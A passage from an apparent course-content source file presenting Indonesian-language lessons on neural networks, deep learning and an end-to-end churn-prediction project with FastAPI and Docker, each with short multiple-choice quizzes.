- Weight (w)   : kekuatan koneksi antar neuron
- Bias (b)     : offset
- Activation   : fungsi non-linear (ReLU, sigmoid, tanh)
- Loss         : ukuran kesalahan (MSE, cross-entropy)
- Optimizer    : update weight (SGD, Adam, RMSprop)
\`\`\`

## Activation Functions

\`\`\`text
ReLU      : max(0, x) - default untuk hidden layer
Sigmoid   : 1/(1+e^-x) - output binary, rentan vanishing gradient
Tanh      : (e^x - e^-x)/(e^x + e^-x) - zero-centered
Softmax   : distribusi probabilitas untuk multi-class
LeakyReLU : max(0.01x, x) - cegah dying ReLU
GELU      : smooth, dipakai di Transformer
\`\`\`

## Forward & Backward Propagation

\`\`\`text
Forward pass : input -> hitung output layer demi layer
Loss calc    : bandingkan output dengan label
Backprop     : hitung gradien loss terhadap weight (chain rule)
Update       : optimizer update weight (gradient descent)
\`\`\`

## MLP dengan Keras/TensorFlow

\`\`\`python
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

# Bangun MLP sederhana
model = keras.Sequential([
    layers.Input(shape=(10,)),
    layers.Dense(64, activation='relu'),
    layers.BatchNormalization(),
    layers.Dropout(0.3),
    layers.Dense(32, activation='relu'),
    layers.BatchNormalization(),
    layers.Dropout(0.3),
    layers.Dense(1, activation='sigmoid')  # binary classification
])

model.compile(
    optimizer=keras.optimizers.Adam(learning_rate=0.001),
    loss='binary_crossentropy',
    metrics=['accuracy', keras.metrics.AUC()]
)

model.summary()
\`\`\`

## Training & Callbacks

\`\`\`python
# Callbacks untuk training lebih cerdas
callbacks = [
    keras.callbacks.EarlyStopping(
        monitor='val_loss', patience=10, restore_best_weights=True
    ),
    keras.callbacks.ReduceLROnPlateau(
        monitor='val_loss', factor=0.5, patience=5
    ),
    keras.callbacks.ModelCheckpoint(
        'best_model.h5', save_best_only=True, monitor='val_loss'
    )
]

history = model.fit(
    X_train, y_train,
    validation_split=0.2,
    epochs=100,
    batch_size=32,
    callbacks=callbacks,
    verbose=1
)

# Visualisasi training
import matplotlib.pyplot as plt
plt.plot(history.history['loss'], label='train')
plt.plot(history.history['val_loss'], label='val')
plt.legend(); plt.title('Loss Curve')
\`\`\`

## PyTorch Implementation

\`\`\`python
import torch
import torch.nn as nn
import torch.optim as optim

class MLP(nn.Module):
    def __init__(self, in_dim, hidden, out_dim):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(in_dim, hidden),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(hidden, hidden // 2),
            nn.ReLU(),
            nn.Linear(hidden // 2, out_dim),
        )
    def forward(self, x):
        return self.net(x)

model = MLP(10, 64, 1)
criterion = nn.BCEWithLogitsLoss()
optimizer = optim.Adam(model.parameters(), lr=0.001)

# Training loop
for epoch in range(50):
    optimizer.zero_grad()
    outputs = model(X_train_tensor)
    loss = criterion(outputs, y_train_tensor)
    loss.backward()
    optimizer.step()
\`\`\`

## Tips Training Neural Network

\`\`\`text
- Mulai sederhana, tambah kompleksitas bertahap
- Normalisasi input (StandardScaler / BatchNorm)
- ReLU sebagai default activation
- Adam optimizer dengan lr 0.001 (default)
- Dropout 0.2-0.5 untuk regularisasi
- Early stopping untuk hindari overfit
- Batch size 32/64/128 (powers of 2)
- Cek overfit: train_loss turun tapi val_loss naik
\`\`\`

> Neural network butuh **banyak data** untuk performa baik. Untuk dataset kecil (<1000 sample), classical ML (Random Forest, XGBoost) sering menang.`,
    quiz: [
      {
        question: "Activation function default untuk hidden layer?",
        options: ["Sigmoid", "Tanh", "ReLU", "Linear"],
        answer: 2,
        explanation: "ReLU (Rectified Linear Unit) adalah default untuk hidden layer karena tidak rentan vanishing gradient."
      },
      {
        question: "Proses update weight di neural network?",
        options: ["Forward propagation", "Backpropagation", "Activation", "Pooling"],
        answer: 1,
        explanation: "Backpropagation menghitung gradien loss terhadap weight menggunakan chain rule, lalu optimizer mengupdate weight."
      },
      {
        question: "Loss function untuk binary classification?",
        options: ["MSE", "Binary Cross-Entropy", "Hinge Loss", "KL Divergence"],
        answer: 1,
        explanation: "Binary Cross-Entropy adalah loss standar untuk binary classification di neural network."
      }
    ]
  },
  {
    level: 8,
    order: 7,
    title: "Deep Learning",
    slug: "deep-learning",
    description: "CNN, RNN, TensorFlow/Keras, dan transfer learning.",
    icon: "🔮",
    isProject: false,
    content: `# Deep Learning

**Deep Learning** adalah subfield ML yang menggunakan neural network dengan banyak layer (deep). Deep learning unggul di computer vision, NLP, dan speech — bidang yang sulit dijangkau classical ML.

## Arsitektur Populer

\`\`\`text
CNN (Convolutional Neural Network) - Computer Vision
  - Conv layer : ekstraksi fitur spasial
  - Pooling    : reduksi dimensi
  - Arsitektur : ResNet, VGG, Inception, EfficientNet

RNN (Recurrent Neural Network) - Sequential Data
  - Memori internal untuk urutan
  - LSTM, GRU untuk long-term dependency
  - Aplikasi: time series, speech, NLP klasik

Transformer - Modern NLP & Vision
  - Self-attention mechanism
  - BERT, GPT, T5, ViT
  - Backbone LLM modern (ChatGPT, Claude, Gemini)

GAN (Generative Adversarial Network)
  - Generator vs Discriminator
  - Generate gambar, video, deepfake
\`\`\`

## CNN untuk Image Classification

\`\`\`python
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

model = keras.Sequential([
    layers.Input(shape=(224, 224, 3)),
    layers.Conv2D(32, 3, activation='relu', padding='same'),
    layers.MaxPooling2D(),
    layers.Conv2D(64, 3, activation='relu', padding='same'),
    layers.MaxPooling2D(),
    layers.Conv2D(128, 3, activation='relu', padding='same'),
    layers.MaxPooling2D(),
    layers.GlobalAveragePooling2D(),
    layers.Dense(128, activation='relu'),
    layers.Dropout(0.5),
    layers.Dense(10, activation='softmax')  # 10 classes
])

model.compile(
    optimizer='adam',
    loss='sparse_categorical_crossentropy',
    metrics=['accuracy']
)
model.summary()
\`\`\`

## Data Augmentation

\`\`\`python
from tensorflow.keras.layers import RandomFlip, RandomRotation, RandomZoom

augment = keras.Sequential([
    RandomFlip('horizontal'),
    RandomRotation(0.1),
    RandomZoom(0.1),
])

# Atau pakai tf.data pipeline
def augment_fn(image, label):
    image = tf.image.random_flip_left_right(image)
    image = tf.image.random_brightness(image, max_delta=0.2)
    return image, label

train_ds = train_ds.map(augment).prefetch(tf.data.AUTOTUNE)
\`\`\`

## Transfer Learning

\`\`\`python
# Pakai pre-trained ResNet50 (ImageNet), fine-tune untuk task baru
base = keras.applications.ResNet50(
    weights='imagenet', include_top=False, input_shape=(224, 224, 3)
)
base.trainable = False  # freeze backbone

inputs = keras.Input(shape=(224, 224, 3))
x = keras.applications.resnet50.preprocess_input(inputs)
x = base(x, training=False)
x = layers.GlobalAveragePooling2D()(x)
x = layers.Dropout(0.3)(x)
outputs = layers.Dense(10, activation='softmax')(x)
model = keras.Model(inputs, outputs)

model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy'])

# Train top layer dulu, baru unfreeze sebagian backbone untuk fine-tune
\`\`\`

## RNN/LSTM untuk Text/Sequence

\`\`\`python
model = keras.Sequential([
    layers.Embedding(input_dim=10000, output_dim=128, input_length=100),
    layers.Bidirectional(layers.LSTM(64, return_sequences=True)),
    layers.Bidirectional(layers.LSTM(32)),
    layers.Dense(64, activation='relu'),
    layers.Dropout(0.5),
    layers.Dense(1, activation='sigmoid')  # sentiment: pos/neg
])

model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
\`\`\`

## Transfer Learning NLP (Transformer)

\`\`\`python
from transformers import AutoTokenizer, TFAutoModelForSequenceClassification

# Pakai pre-trained BERT
model_name = "indobenchmark/indobert-base-p1"
tokenizer = AutoTokenizer.from_pretrained(model_name)
model = TFAutoModelForSequenceClassification.from_pretrained(model_name, num_labels=3)

# Tokenize
texts = ["film ini bagus", "layanan buruk", "biasa saja"]
inputs = tokenizer(texts, padding=True, truncation=True, return_tensors="tf")
outputs = model(inputs)
\`\`\`

## Training Deep Learning: Best Practices

\`\`\`text
- GPU/TPU wajib (Colab, Kaggle, AWS p3/g4, Vast.ai)
- Pakai mixed precision (fp16) untuk speed
- Transfer learning >> from scratch untuk dataset kecil
- Augmentasi data untuk cegah overfit
- Learning rate scheduler (cosine, warmup)
- Batch normalization / Layer normalization
- Monitor val_loss, early stopping
- Save checkpoint tiap epoch terbaik
- TensorBoard untuk visualisasi training
\`\`\`

> Deep learning adalah seni trade-off antara **kapasitas model** dan **jumlah data**. Model terlalu besar + data sedikit = overfit. Gunakan transfer learning sebagai starting point.`,
    quiz: [
      {
        question: "Arsitektur neural network untuk computer vision?",
        options: ["RNN", "CNN", "LSTM", "Transformer-only"],
        answer: 1,
        explanation: "CNN (Convolutional Neural Network) menggunakan konvolusi untuk ekstraksi fitur spasial gambar."
      },
      {
        question: "Apa itu transfer learning?",
        options: ["Training model dari nol", "Pakai model pre-trained untuk task baru", "Memindahkan data antar server", "Mengganti GPU"],
        answer: 1,
        explanation: "Transfer learning memanfaatkan model pre-trained (misal ResNet di ImageNet) lalu fine-tune untuk task spesifik."
      },
      {
        question: "Komponen utama arsitektur Transformer?",
        options: ["Convolution", "Self-attention", "Pooling", "Recurrent"],
        answer: 1,
        explanation: "Self-attention mechanism adalah inti Transformer, memungkinkan model melihat hubungan seluruh token sekaligus."
      }
    ]
  },
  {
    level: 8,
    order: 8,
    title: "Project: ML Model",
    slug: "project-ml-model",
    description: "Membangun model machine learning end-to-end dari data hingga deployment.",
    icon: "🚀",
    isProject: true,
    content: `# Project: ML Model End-to-End

Projek akhir ini menggabungkan seluruh konsep yang sudah dipelajari — dari data preprocessing, training, hingga deployment — menjadi satu pipeline ML production-ready.

## Skenario Projek

\`\`\`text
Aplikasi: "Churn Predictor"
- Prediksi customer yang akan churn (berhenti berlangganan)
- Dataset: telecom customer churn (5000 record)
- Stack: Python, scikit-learn, FastAPI, Docker
- Output: REST API + web UI sederhana
\`\`\`

## Step 1: Setup Project Structure

\`\`\`bash
mkdir churn-predictor && cd churn-predictor
python -m venv venv && source venv/bin/activate
pip install pandas scikit-learn fastapi uvicorn joblib pydantic

mkdir -p app data models notebooks
touch app/main.py app/model.py requirements.txt
\`\`\`

\`\`\`text
churn-predictor/
├── app/
│   ├── main.py          # FastAPI server
│   ├── model.py         # predict logic
├── data/
│   └── churn.csv
├── models/
│   └── model.joblib     # trained model
├── notebooks/
│   └── eda.ipynb
├── train.py             # training script
├── requirements.txt
└── Dockerfile
\`\`\`

## Step 2: EDA & Preprocessing (notebook)

\`\`\`python
# notebooks/eda.ipynb
import pandas as pd
import seaborn as sns

df = pd.read_csv('../data/churn.csv')
print(df.shape, df.dtypes)
print(df['churn'].value_counts(normalize=True))

# Cek missing
print(df.isnull().sum())

# Encode kategorikal
df = pd.get_dummies(df, columns=['contract', 'payment_method'], drop_first=True)

# Encode target
df['churn'] = df['churn'].map({'No': 0, 'Yes': 1})

# Korelasi
sns.heatmap(df.corr()['churn'].sort_values().to_frame(), annot=True)
\`\`\`

## Step 3: Training Script

\`\`\`python
# train.py
import pandas as pd
import joblib
from sklearn.model_selection import train_test_split
from sklearn.ensemble import GradientBoostingClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.pipeline import Pipeline
from sklearn.metrics import classification_report, roc_auc_score

df = pd.read_csv('data/churn.csv')
# ... (preprocessing sama dengan EDA)

X = df.drop('churn', axis=1)
y = df['churn']
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, stratify=y, random_state=42)

pipeline = Pipeline([
    ('scaler', StandardScaler()),
    ('clf', GradientBoostingClassifier(random_state=42))
])
pipeline.fit(X_train, y_train)

y_pred = pipeline.predict(X_test)
y_proba = pipeline.predict_proba(X_test)[:, 1]
print(classification_report(y_test, y_pred))
print(f"ROC-AUC: {roc_auc_score(y_test, y_proba):.4f}")

joblib.dump({'pipeline': pipeline, 'features': list(X.columns)}, 'models/model.joblib')
\`\`\`

## Step 4: FastAPI Server

\`\`\`python
# app/main.py
from fastapi import FastAPI
from pydantic import BaseModel
import joblib
import pandas as pd

app = FastAPI(title="Churn Predictor")
artifact = joblib.load('models/model.joblib')
pipeline = artifact['pipeline']
features = artifact['features']

class CustomerData(BaseModel):
    tenure: int
    monthly_charges: float
    total_charges: float
    contract_two_year: int
    payment_method_credit: int

@app.get("/health")
def health():
    return {"status": "ok"}

@app.post("/predict")
def predict(data: CustomerData):
    df = pd.DataFrame([data.dict()])
    for col in features:
        if col not in df.columns:
            df[col] = 0
    df = df[features]
    prob = pipeline.predict_proba(df)[0][1]
    return {"churn_probability": float(prob), "will_churn": bool(prob > 0.5)}
\`\`\`

## Step 5: Dockerize & Deploy

\`\`\`dockerfile
# Dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 8000
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]
\`\`\`

\`\`\`bash
# Build & run
docker build -t churn-predictor:1.0 .
docker run -p 8000:8000 churn-predictor:1.0

# Test API
curl -X POST http://localhost:8000/predict \\
  -H "Content-Type: application/json" \\
  -d '{"tenure": 2, "monthly_charges": 95.5, "total_charges": 200, "contract_two_year": 0, "payment_method_credit": 1}'
\`\`\`

## Step 6: Monitoring Plan

\`\`\`text
Yang dipantau production:
- Request latency & error rate (Prometheus + Grafana)
- Data drift: distribusi input berubah?
- Prediction drift: distribusi output berubah?
- Ground truth feedback loop (kapan churn aktual terjadi)
- Retraining schedule: bulanan atau saat drift > threshold
\`\`\`

## Deliverables

\`\`\`text
1. GitHub repo dengan README lengkap
2. Jupyter notebook EDA
3. train.py reproducible
4. FastAPI dengan /predict endpoint
5. Dockerfile
6. Unit test
7. CI/CD (GitHub Actions): lint, test, build, push
8. Demo video / screenshot
9. Dokumentasi API (Swagger auto dari FastAPI)
\`\`\`

> Projek akhir adalah portofolio Anda. **Kualitas dokumentasi** sering lebih penting daripada akurasi model — recruiter ingin melihat proses berpikir Anda, bukan hanya angka.`,
    quiz: [
      {
        question: "Library Python untuk membangun REST API ML?",
        options: ["Flask", "FastAPI", "Django", "Express"],
        answer: 1,
        explanation: "FastAPI populer untuk serving ML model karena cepat, async, dan auto-generate dokumentasi Swagger."
      },
      {
        question: "Yang HARUS disimpan selain model untuk prediksi production?",
        options: ["Editor kode", "Preprocessing pipeline & feature order", "Versi Python", "OS host"],
        answer: 1,
        explanation: "Pipeline preprocessing dan urutan feature harus disimpan agar input baru di-preprocess konsisten dengan training."
      },
      {
        question: "Yang dipantau untuk deteksi data drift?",
        options: ["Distribusi input & output", "Versi library", "Jumlah commit", "Jumlah developer"],
        answer: 0,
        explanation: "Data drift terjadi saat distribusi input/output di production berubah dari training, perlu retraining."
      }
    ]
  }
];
